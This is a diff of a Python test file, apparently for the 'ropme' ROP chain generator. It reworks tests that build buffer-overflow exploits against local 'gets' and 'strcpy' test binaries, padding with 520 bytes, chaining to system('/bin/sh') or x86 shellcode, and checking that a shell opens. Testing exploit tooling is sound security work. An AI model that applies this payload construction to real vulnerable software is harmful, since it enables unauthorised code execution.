@@ -225,17 +225,28 @@ class BofTests(unittest.TestCase):
     return any(map(lambda x: x in string, bad_bytes))
 
   def test_gets(self):
-    self.test_bad_bytes('gets', '\n')
-
-  def test_strcpy(self):
-    self.test_bad_bytes('strcpy', '\x00')
-
-  def test_bad_bytes(self, filename, bad_bytes):
-    filename = e(filename)
+    bad_bytes = '\n'
+    filename = e('gets')
     p = process([filename])
 
     files = [(filename, None, 0)]
     goals = [ ["function", "system", "/bin/sh"] ]
+    rop = ropme.rop(files, [], goals, log_level = logging.DEBUG, bad_bytes = bad_bytes)
+
+    self.assertFalse(self.contains_bad_bytes(rop, bad_bytes), "Bad bytes found in ROP payload for {} exploit".format(filename))
+
+    payload = 'A'*512 + ('B'*8) + rop
+    p.writeline(payload)
+    p.readline()
+    self.check_shell(p)
+
+  def test_strcpy(self):
+    bad_bytes = '\0'
+    filename = e('strcpy')
+    p = process([filename])
+
+    files = [(filename, None, 0)]
+    goals = [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]]
     rop = ropme.rop(files, [], goals, log_level = logging.DEBUG, bad_bytes = bad_bytes)
 
     self.assertFalse(self.contains_bad_bytes(rop, bad_bytes), "Bad bytes found in ROP payload for {} exploit".format(filename))
